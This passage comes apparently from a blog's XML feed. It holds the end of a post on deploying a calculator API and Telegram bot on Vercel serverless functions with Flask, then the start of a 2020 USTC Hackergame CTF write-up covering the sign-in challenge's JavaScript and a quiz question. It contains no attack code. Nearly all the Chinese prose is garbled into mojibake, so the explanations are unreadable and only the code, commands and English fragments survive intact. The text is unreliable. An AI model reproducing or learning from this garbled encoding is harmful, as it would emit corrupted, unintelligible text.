class="language-bash">vercel login</code></pre><p>è‹¥ç›´æ¥éƒ¨ç½²å½“å‰æ–‡ä»¶å¤¹ï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œè¾“å…¥</p><pre class="language-bash" data-language="bash"><code class="language-bash">vercel</code></pre><p>è€ŒåæŒ‰ç…§æç¤ºè¿›è¡Œæ“ä½œå³å¯ã€‚</p><p>å…¶ä¸­ä¼šè¯¢é—®ä½ é¡¹ç›®åç§°ï¼Œé¦–æ¬¡éƒ¨ç½²æ—¶ä¼šä»¥æ­¤ç»™ä½ åˆ†é…ä¸€ä¸ª <code>*.vercel.app</code> ä¹‹ç±»çš„å…è´¹åŸŸåï¼Œè¿™ä¸ªå¯¹åº”ç€ç”Ÿäº§ç¯å¢ƒã€‚è€Œ <code>*.&lt;username&gt;.vercel.app</code> åˆ™å¯¹åº”ç€ é¢„è§ˆç¯å¢ƒ/å¼€å‘ç¯å¢ƒ (preview)ã€‚</p><p>ä¹‹åçš„æ¯ä¸€æ¬¡éƒ¨ç½²éƒ½ä¼šéƒ¨ç½²åˆ° Preview ç¯å¢ƒï¼Œç¡®å®šæ²¡é—®é¢˜åå†ç”¨ä¸‹é¢çš„å‘½ä»¤éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒå³å¯ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">vercel --prod</code></pre><p>ä¸¤ä¸ªç¯å¢ƒåˆ†ç¦»å¼€æ¥å°±å¾ˆå¥½ç”¨ï¼Œèµä¸€ä¸ªã€‚</p><p>å½“ç„¶ Vercel è¿˜æ”¯æŒç»‘å®šè‡ªå·±çš„åŸŸåï¼Œåªéœ€è¦æ”¹ä¸€æ”¹ CNAME å°±å¥½ï¼Œè¿˜èƒ½è‡ªåŠ¨å¸®ä½ é…ä¸Š Letâ€™s encrypt! çš„è¯ä¹¦ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨ Settings ä¸‹çš„ Tokens é‡Œæ–°å»ºä¸€ä¸ª tokenï¼Œåˆ©ç”¨å…¶æ¥è¿›è¡Œéƒ¨ç½²ã€‚</p><p><img src="/2020/11/18/Server_Vercel_Calc114514/image-20201119010712433.png" alt="token"></p><pre class="language-bash" data-language="bash"><code class="language-bash">vercel -t <span class="token operator">&lt;</span>TOKEN Here<span class="token operator">&gt;</span></code></pre><p>è¿™ä¸€æ“ä½œå¾ˆé€‚åˆåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä»¥åŠå¯ä»¥ç™½å«– CI è¿›è¡Œéƒ¨ç½²ã€‚</p><p>ï¼ˆå˜¿å˜¿ï¼Œå¯ä»¥åœ¨ Organization é‡Œè¿›è¡Œæ„å»ºäº†</p><p>æ›´å¤š CLI ä½¿ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒ <a href="https://vercel.com/docs/cli#commands/overview">å®˜æ–¹ CLI Reference</a>ã€‚</p><h3 id="Serverless-éƒ¨ç½²"><a href="#Serverless-éƒ¨ç½²" class="headerlink" title="Serverless éƒ¨ç½²"></a>Serverless éƒ¨ç½²</h3><p>ä¸‹é¢å°±åˆ°äº†æ„‰å¿«çš„ Serverless éƒ¨ç½²ç¯èŠ‚äº†ã€‚</p><p>å‚è€ƒ <a href="https://vercel.com/docs/serverless-functions/introduction#">Serverless Functions å®˜æ–¹æ–‡æ¡£</a>ï¼Œæˆ‘ä»¬éœ€è¦æ–°å»ºä¸€ä¸ª <code>api</code> æ–‡ä»¶å¤¹ï¼Œåœ¨é‡Œé¢æ”¾æˆ‘ä»¬çš„ä»£ç ã€‚</p><p>ç›®å‰æ”¯æŒçš„åç«¯è¯­è¨€åŒ…æ‹¬ï¼š</p><ul><li><a href="https://vercel.com/docs/serverless-functions/supported-languages#node.js">Node.js</a></li><li><a href="https://vercel.com/docs/serverless-functions/supported-languages#go">Go</a></li><li><a href="https://vercel.com/docs/serverless-functions/supported-languages#python">Python</a></li><li><a href="https://vercel.com/docs/serverless-functions/supported-languages#ruby">Ruby</a></li></ul><p>æˆ‘è¿™é‡Œä½¿ç”¨çš„æ„Ÿè§‰çš„è¯ï¼ŒJSæ”¯æŒæœ€å¥½ï¼Œæ¯•ç«Ÿè‡ªå®¶æœ‰ Next.jsã€‚</p><p>è€Œ Python çš„è¯å…¶å®æ”¯æŒå¹¶æ²¡æœ‰é‚£ä¹ˆå¥½ï¼Œäºæ˜¯å°±é‡åˆ°äº†ä¸€äº›é—®é¢˜ã€‚ã€‚</p><blockquote><p>Python files within the <code>api</code> directory, containing an handler variable that inherits from the <code>BaseHTTPRequestHandler</code> class or an <code>app</code> variable that exposes a WSGI or ASGI application, will be served as Serverless Functions.</p></blockquote><p>æ¯”å¦‚è·¯ç”±é—®é¢˜ï¼Œå®ƒé»˜è®¤æ˜¯ä¸€ä¸ªæ–‡ä»¶å¯¹åº”ä¸€ä¸ªè·¯ç”±ï¼Œå³å…¶æ–‡ä»¶åå°±æ˜¯å…¶è·¯ç”±ã€‚</p><p>ä½†è¿™ä¸åˆé€‚ï¼Œæˆ‘ä»¬è¿™é‡Œæ˜¯åœ¨ä¸€ä¸ª py æ–‡ä»¶é‡Œé€šè¿‡ Flask æ¥å¤„ç†è·¯ç”±ï¼Œæš´éœ²ä¸€ä¸ª <code>app</code> å¯¹è±¡ã€‚äºæ˜¯éœ€è¦è‡ªå·±é…ç½®ä¸€ä¸‹ã€‚</p><p>åœ¨ <code>api</code> å¤–é¢çš„ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª <code>vercel.json</code> æ–‡ä»¶ï¼Œåœ¨é‡Œé¢è¿›è¡Œé…ç½®ã€‚</p><p>å‚è€ƒ <a href="https://vercel.com/docs/configuration#introduction/configuration-reference">Configuration Reference</a>ï¼Œæˆ‘è¿™é‡ŒæŠŠ <code>/api(.*)</code> éƒ½äº¤ç»™ <code>api/main.py</code> æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œè¿™æ ·å°±èƒ½è§£å†³è·¯ç”±é—®é¢˜ã€‚</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"version"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token property">"routes"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"Access-Control-Allow-Origin"</span><span class="token operator">:</span> <span class="token string">"*"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"src"</span><span class="token operator">:</span> <span class="token string">"/api(.*)"</span><span class="token punctuation">,</span><span class="token property">"dest"</span><span class="token operator">:</span> <span class="token string">"api/main.py"</span><span class="token punctuation">,</span><span class="token property">"continue"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>åŒæ—¶è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>main.py</code> é‡Œçš„è·¯ç”±ä¹Ÿéœ€è¦åŒ…å« <code>/api</code>ï¼Œä¾‹å¦‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/calc'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">api_calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Calculate 114514 API    """</span>    <span class="token keyword">pass</span></code></pre><hr><h2 id="0x05-éƒ¨ç½²-Telegram-bot"><a href="#0x05-éƒ¨ç½²-Telegram-bot" class="headerlink" title="0x05 éƒ¨ç½² Telegram bot"></a>0x05 éƒ¨ç½² Telegram bot</h2><p><strong>Telegram bot æ‰æ˜¯è¿™æ¬¡çš„é‡ç‚¹å§ã€‚</strong></p><p>ç”±äº Telegram ç»™æˆ‘ä»¬æä¾›äº† <strong>Webhook</strong> è¿™ç§å¤„ç†æ¶ˆæ¯çš„æ–¹å¼ï¼Œå½“ bot æ¥æ”¶åˆ°ç”¨æˆ·å‘æ¥çš„æ¶ˆæ¯åï¼ŒTelegram æœåŠ¡å™¨ä¼šç»™ä½ è®¾ç½® Webhook çš„ URI å‘ä¸€ä¸ª POST è¯·æ±‚ï¼Œå¯¹è¿™ä¸ªåŒ…è¿›è¡Œè§£æå°±èƒ½å¾—åˆ°ç”¨æˆ·çš„æ¶ˆæ¯ç­‰ä¿¡æ¯ã€‚è¿›è€Œå¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå†é€šè¿‡ TG bot çš„ API ç»™ç”¨æˆ·å›å¤æ¶ˆæ¯å°±å®Œäº‹äº†ã€‚</p><p>é¦–å…ˆéœ€è¦è®¾ç½®å¥½ Webhook åˆ° Vercel çš„ URI ä¸Šï¼Œåˆ©ç”¨ Flask çš„è·¯ç”±å»æ¥æ”¶ã€‚è¿™é‡Œç•¥äº†ã€‚</p><p>è€Œå¤„ç†æ¶ˆæ¯çš„éƒ¨åˆ†ï¼Œåœ¨å†™çš„æ—¶å€™æœ€å¼€å§‹æ˜¯æƒ³è‡ªå·±å†™çš„ï¼Œæ¯•ç«Ÿå¹¶ä¸å¤æ‚ï¼Œå®ƒé€æ¥çš„æ˜¯ä¸ª JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæå–ä¸€ä¸‹å°±å®Œäº‹äº†ã€‚</p><p>ä½†æ˜¯ä¸»è¦æƒ³å®ç°ä¸€ä¸ªå†…è”æŸ¥è¯¢ï¼ˆinline queryï¼‰çš„åŠŸèƒ½ï¼ŒåŒæ—¶è¿˜è¦å…¼é¡¾æ¶ˆæ¯å›å¤ï¼Œå°±è§‰å¾—æœ‰ç‚¹éº»çƒ¦ï¼Œè¿˜ä¸å¦‚ç”¨ç°æˆçš„è½®å­ï¼Œæ‡’å¾—é€ è½®å­äº†ã€‚</p><p>å» GitHub ä¸Šæœäº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸¤å¤§ç°æˆè½®å­ï¼š**<a href="https://github.com/python-telegram-bot/python-telegram-bot">python-telegram-bot</a>** åŠ **<a href="https://github.com/eternnoir/pyTelegramBotAPI">pyTelegramBotAPI</a>**ã€‚</p><p>ä»–ä»¬çš„æ–‡æ¡£éƒ½æŒºä¸°å¯Œçš„ï¼Œä¹Ÿæœ‰å¾ˆå¤šä¾‹å­ã€‚ä¸»è¦å°±æ˜¯å¯¹å®˜æ–¹çš„ HTTP API æ¥å£è¿›è¡Œäº†å°è£…ï¼Œå¤„ç†æ¶ˆæ¯ä¸Šå¥½åƒè¿˜åšäº†ä¸ªé˜Ÿåˆ—ï¼Œç”¨äº†å¼‚æ­¥å®ç°çš„æ„Ÿè§‰ã€‚</p><p><em>ï¼ˆu1s1ï¼Œé‚£æ—¶æˆ‘ä¸€åº¦æœ‰ è¿˜ä¸å¦‚è‡ªå·±å†™ çš„æ„Ÿè§‰</em></p><p>å…¶ä¸­å‰è€…æœ¬èº«å¸¦æœ‰ä¸€ä¸ª webhook æœåŠ¡å™¨ï¼Œä½†è¯•äº†å‘ç°ä¸ç¬¦åˆ Vercel çš„è¦æ±‚ï¼Œæ²¡æœ‰æš´éœ² <code>app</code> å¯¹è±¡ä¹‹ç±»çš„ï¼Œäºæ˜¯è·‘ä¸èµ·æ¥ã€‚</p><p>åè€…åˆ™æä¾›äº†ä¸€ä¸ª webhook heroku éƒ¨ç½²çš„æ ·ä¾‹ï¼Œå³ pyTelegramBotAPI/examples/webhook_examples/<a href="https://github.com/eternnoir/pyTelegramBotAPI/blob/master/examples/webhook_examples/webhook_flask_heroku_echo.py">webhook_flask_heroku_echo.py</a>  </p><p><strong>å…³é”®ä»£ç ï¼š</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@server<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token operator">+</span> TOKEN<span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    bot<span class="token punctuation">.</span>process_new_updates<span class="token punctuation">(</span><span class="token punctuation">[</span>telebot<span class="token punctuation">.</span>types<span class="token punctuation">.</span>Update<span class="token punctuation">.</span>de_json<span class="token punctuation">(</span>request<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token number">200</span></code></pre><p><code>process_new_updates</code> è¿™ä¸ªæ–¹æ³•èƒ½æŠŠæ¥æ”¶åˆ°çš„ä¿¡æ¯ä¼ è¿›å»ï¼Œä»è€Œå»ºç«‹äº† Webhook å’Œ pyTelegramBotAPI çš„è”ç³»ã€‚</p><p>äºæ˜¯å°±ç”¨ pyTelegramBotAPI è¿™ä¸ªæ¥å®ç°äº†ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªå‘å°±æ˜¯ï¼Œå¯èƒ½æ˜¯ç”±äºå¼‚æ­¥å¤„ç†æ¶ˆæ¯çš„åŸå› ï¼ŒVercel Serverless ä¸­çš„ <code>process_new_updates</code> ç»“æŸ return ä¹‹åè¿™ä¸ªä¼šè¯å°±å…³é—­äº†ï¼Œæ¶ˆæ¯è¿˜æ¥ä¸åŠå¤„ç†å®Œå›é€ç»™ Telegramã€‚åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ç»å¸¸å°±æ¶ˆæ¯è«åå…¶å¦™ä¸¢å¤±äº†ï¼Œæˆ–è€…è¿ç€å‘å‡ æ¡æ¶ˆæ¯æ‰å›å¤çš„æƒ…å†µã€‚</p><p>åæ¥å°è¯•äº†åŠ ä¸€ä¸ª <code>bot.get_me()</code> æ¥ç¼“è§£ã€‚</p><p>å†åæ¥ï¼Œå‘ç°ç›´æ¥åŠ ä¸ªå»¶æ—¶å°±å®Œäº‹äº†ï¼Œ<code>time.sleep(0.5)</code>ï¼Œåªéœ€è¦ 0.5s å»¶æ—¶ï¼Œç®€å•ç²—æš´è§£å†³é—®é¢˜ã€‚</p><p>ï¼ˆå–µå–µ~</p><p>ç›¸å…³ä»£ç ä½äº GitHub repo <a href="https://github.com/miaotony/calc114514">https://github.com/miaotony/calc114514</a> çš„ <code>/api/</code> ç›®å½•ä¸‹ï¼Œ<code>main.py</code> å†…åŒ…å«äº†å¼€æ”¾æ¥å£å’Œ bot äº¤äº’çš„ç›¸å…³æ¥å£ã€‚</p><h3 id="å¼€å‘è¯´æ˜"><a href="#å¼€å‘è¯´æ˜" class="headerlink" title="å¼€å‘è¯´æ˜"></a><strong>å¼€å‘è¯´æ˜</strong></h3><ol><li><p>Install the requirements. å®‰è£…ä¾èµ–ã€‚</p><pre class="language-none"><code class="language-none">pip3 install -r requirements.txt</code></pre></li><li><p>Edit your Telegram bot token and Webhook URL path in the <code>secret.example.py</code>. è¿™é‡Œæˆ‘æŠŠå…³é”®é…ç½®ä¸“é—¨æ‹¿å‡ºæ¥æ”¾åˆ° <code>secret.example.py</code> æ–‡ä»¶é‡Œäº†ï¼Œå¼€å‘çš„æ—¶å€™è¦ä¿®æ”¹æˆä½ çš„ã€‚</p></li><li><p>Rename <code>secret.example.py</code> to <code>secret.py</code>. æ”¹åã€‚</p></li><li><p>Run the backend, for example, <code>gunicorn main:app</code>. è¿è¡Œåç«¯ç¨‹åºã€‚</p></li></ol><p><strong>åŸºäº Vercel éƒ¨ç½²ï¼š</strong></p><p>åœ¨é…ç½®å¥½ <code>vercel.json</code> å’Œ <code>api</code> ç›®å½•çš„åŸºç¡€ä¸Šï¼Œç›´æ¥ç”¨ CLI ä¸Šä¼ å³å¯ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">vercel</code></pre><hr><h2 id="0x06-FrontEnd-å‰ç«¯"><a href="#0x06-FrontEnd-å‰ç«¯" class="headerlink" title="0x06 FrontEnd  å‰ç«¯"></a>0x06 FrontEnd  å‰ç«¯</h2><p>æœ€åï¼Œå¯»æ€ç€å’± API éƒ½å¼„å¥½äº†ï¼Œä¸å¦‚å†æ•´ä¸ªå‰ç«¯ç•Œé¢å§ã€‚</p><p>ç”±äºé‡‡ç”¨äº†å‰åç«¯åˆ†ç¦»æ¶æ„ï¼Œç›´æ¥è°ƒç”¨ä¹‹å‰å†™çš„ API å°±å¥½äº†ã€‚</p><p>æƒ³åˆ° Hackergame 2020 ç­¾åˆ°é¢˜é‚£ä¸ªç•Œé¢å°±ä¸é”™ï¼Œäºæ˜¯åœ¨æ­¤åŸºç¡€ä¸Šé­”æ”¹äº†ä¸€ä¸‹ï¼ŒåŠ äº†ä¸ª AJAX ç½‘ç»œè¯·æ±‚ï¼Œé¡ºä¾¿åšäº†ä¸ªè¾“å…¥æ¡†å’Œæ»‘å—çš„åŒå‘æ•°æ®ç»‘å®šã€‚</p><p>å‰ç«¯æœ¬èº«å°±æ˜¯é™æ€æ–‡ä»¶äº†ï¼Œç›´æ¥æ‰”æ ¹ç›®å½•ä¸‹ï¼ŒåŸºäº Vercel éƒ¨ç½²å°±å®Œäº‹äº†ã€‚</p><p>è¯¦è§ï¼š <a href="https://calc114514.vercel.app/?from=blog">https://calc114514.vercel.app/</a></p><p><img src="/2020/11/18/Server_Vercel_Calc114514/image-20201112225921026.png"></p><p><img src="/2020/11/18/Server_Vercel_Calc114514/image-20201112225938571.png" alt="img"></p><p>BTW, å½“ä½ æƒ³è¦è®ºè¯ 114514 çš„æ—¶å€™ä¼šç»™ä½ å¤šæç¤ºä¸ªâ€œæ¶è‡­çš„â€ <em>ï¼ˆå˜»å˜»</em></p><hr><h2 id="0x07-Summary-å°ç»“"><a href="#0x07-Summary-å°ç»“" class="headerlink" title="0x07 Summary å°ç»“"></a>0x07 Summary å°ç»“</h2><p>æ€»ä¹‹å°±æ˜¯å†™äº†ä¸€å¤§ç‰ˆï¼Œä»è®ºè¯ç®—æ³•åˆ°æ¥å£éƒ¨ç½²åˆ° Telegram bot éƒ¨ç½²å†åˆ°å‰ç«¯ç•Œé¢ï¼ŒæŠŠæ•´ä¸ªå®ç°çš„è¿‡ç¨‹è¯´äº†ä¸€é€šã€‚</p><p><strong>å‰ç«¯ï¼š</strong><a href="https://calc114514.vercel.app/?from=blog">https://calc114514.vercel.app/</a></p><p><strong>Telegram bot:</strong> <a href="https://t.me/calc114514bot">@calc114514bot</a>.</p><p>ä»£ç å¼€æºåœ¨ GitHub ä¸Šï¼š<a href="https://github.com/miaotony/calc114514">https://github.com/miaotony/calc114514</a></p><p>èµ°è¿‡è·¯è¿‡ç‚¹ä¸ª STAR å§~</p><p><em>ï¼ˆServerless çœŸé¦™ï¼</em></p><p>å½“ç„¶æœ€åè¿˜æ˜¯æä¸€å¥â€”â€”</p><p><strong>æœ¬æ–‡ç›¸å…³å†…å®¹ä»…ä¾›å­¦ä¹ ç ”ç©¶ä½¿ç”¨ï¼Œè¯·åœ¨åˆç†åˆæ³•èŒƒå›´å†…ä½¿ç”¨ï¼Œè¯·å‹¿æ»¥ç”¨ï¼</strong></p><hr><h2 id="0xFF-Extensive-Reading"><a href="#0xFF-Extensive-Reading" class="headerlink" title="0xFF Extensive Reading"></a>0xFF Extensive Reading</h2><p><a href="https://www.v2ex.com/t/683606">V2EX: åŸºäº Vercel æä¾›çš„ Serverless å†™çš„æœåŠ¡</a></p><p><a href="https://www.xuthus.cc/go/vercel-run-go.html">vercel æ— æœåŠ¡éƒ¨ç½² Go å‡½æ•°</a></p><p><a href="https://www.ixiqin.com/2020/06/how-to-free-for-your-organizations-project-configuration-vercel/">å¦‚ä½•å…è´¹ä¸ºä½ çš„ç»„ç»‡é¡¹ç›®é…ç½® Vercel</a> ï¼ˆè¿™ä¸ªå°±æ˜¯ç”¨åˆ°äº†ä¸Šé¢æ‰€è¯´çš„ Tokenï¼‰</p><p><em>ï¼ˆæºœäº†æºœäº†å–µ~</em></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Projects </tag>
            
            <tag> Web </tag>
            
            <tag> Server </tag>
            
            <tag> Serverless </tag>
            
            <tag> Vercel </tag>
            
            <tag> Telegram </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 USTC Hackergame WriteUp</title>
      <link href="2020/11/08/CTF_2020Hackergame/"/>
      <url>2020/11/08/CTF_2020Hackergame/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸€å¹´ä¸€åº¦çš„ USTC Hackergame åˆæ¥äº†ã€‚</p><blockquote><p><strong>ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ç¬¬ä¸ƒå±Šä¿¡æ¯å®‰å…¨å¤§èµ›</strong></p><p>æ¯”èµ›å¹³å°ï¼š<a href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn/</a></p><p>å®˜æ–¹ WriteUp &amp; é¢˜ç›®å­˜æ¡£ï¼š<a href="https://github.com/USTC-Hackergame/hackergame2020-writeups">https://github.com/USTC-Hackergame/hackergame2020-writeups</a></p></blockquote><p>æ­£å¥½è¿™å‘¨äº‹æƒ…ä¸æ˜¯å¾ˆå¤šï¼Œæœ‰æœºä¼šæ¥æ‰“ä¸€æ‰“ç©ä¸€ç©ã€‚</p><p>ç”±äºæ€•æ¯”èµ›ç»“æŸå†å†™æˆ‘ä¼šå’•å’•å’•ï¼Œäºæ˜¯å°±è¾¹åšé¢˜è¾¹å†™ WriteUp äº†ã€‚</p><p>æ¯”èµ›ç»“æŸä¹‹ååˆå¤ç°äº†å‡ é“è¢«å¡ä½çš„é¢˜è¿™æ ·ã€‚</p><p><em>ï¼ˆè¿™ç¯‡ç‰¹åˆ«é•¿ç‰¹åˆ«é•¿ç‰¹åˆ«é•¿â€¦â€¦</em></p><hr><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>FLAG æå–å™¨ è¿˜è¡Œã€‚</p><p>ï¼ˆå°±æ˜¯ä¸æƒ³ç»™ä½ 1ä¸ª flag å§ 233</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> prevVal <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#show"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ²¡æƒ³åˆ°å§!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">1.00001</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>prevVal <span class="token operator">==</span> <span class="token number">1.00001</span><span class="token punctuation">)</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">0.99999</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>prevVal <span class="token operator">==</span> <span class="token number">0.99999</span><span class="token punctuation">)</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">1.00001</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#show"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        prevVal <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ç›´æ¥æ”¹ url å°±å®Œäº‹äº†ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161040769.png" alt="signin"></p><hr><h2 id="çŒ«å’ªé—®ç­”"><a href="#çŒ«å’ªé—®ç­”" class="headerlink" title="çŒ«å’ªé—®ç­”++"></a>çŒ«å’ªé—®ç­”++</h2><ol><li><p>ä»¥ä¸‹ç¼–ç¨‹è¯­è¨€ã€è½¯ä»¶æˆ–ç»„ç»‡å¯¹åº”æ ‡å¿—æ˜¯å“ºä¹³åŠ¨ç‰©çš„æœ‰å‡ ä¸ªï¼Ÿ<br>Dockerï¼ŒGolangï¼ŒPythonï¼ŒPlan  9ï¼ŒPHPï¼ŒGNUï¼ŒLLVMï¼ŒSwiftï¼ŒPerlï¼ŒGitHubï¼ŒTortoiseSVNï¼ŒFireFoxï¼ŒMySQLï¼ŒPostgreSQLï¼ŒMariaDBï¼ŒLinuxï¼ŒOpenBSDï¼ŒFreeDOSï¼ŒApache Tomcatï¼ŒSquidï¼ŒopenSUSEï¼ŒKaliï¼ŒXfce.<br>æç¤ºï¼šå­¦æœ¯ä¸Šä¸€èˆ¬è®¤ä¸ºé¾™ä¸å±äºå“ºä¹³åŠ¨ç‰©ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/docker.jpg" alt="docker"></p><p><img src="/2020/11/08/CTF_2020Hackergame/golang.sh-600x600.png" alt="golang"></p><p><img src="/2020/11/08/CTF_2020Hackergame/python.sh-600x600.png" alt="python"></p><p><img src="/2020/11/08/CTF_2020Hackergame/095048hc2bw28c2c3yy82n.jpg" alt="Plan9bunnysmblack"></p><p><img src="/2020/11/08/CTF_2020Hackergame/php-logo.jpeg" alt="php"></p><p><img src="/2020/11/08/CTF_2020Hackergame/9922720e0cf3d7caaa2f7a06f21fbe096a63a9e1" alt="GNU"></p><p><img src="/2020/11/08/CTF_2020Hackergame/perl.jpg" alt="perl"></p><p><img src="/2020/11/08/CTF_2020Hackergame/9e3df8dcd100baa1613b79b74a10b912c8fc2ea2" alt="PostgreSQL"></p><p><img src="/2020/11/08/CTF_2020Hackergame/0dd7912397dda1447af0caafb0b7d0a20cf48636" alt="MariaDB"></p><p>â€¦â€¦</p><p><em>ä¸æ‰¾äº†ï¼ˆæ‡’</em></p><p>æœ€åç›´æ¥ç©·ä¸¾äº†ï¼Œæœ‰ 12 ä¸ªã€‚ï¼ˆè¯¦è§åé¢ï¼‰</p></li><li><p>ç¬¬ä¸€ä¸ªä»¥ä¿¡é¸½ä¸ºè½½ä½“çš„ IP ç½‘ç»œæ ‡å‡†çš„ RFC æ–‡æ¡£ä¸­æ¨èä½¿ç”¨çš„ MTU (Maximum Transmission Unit) 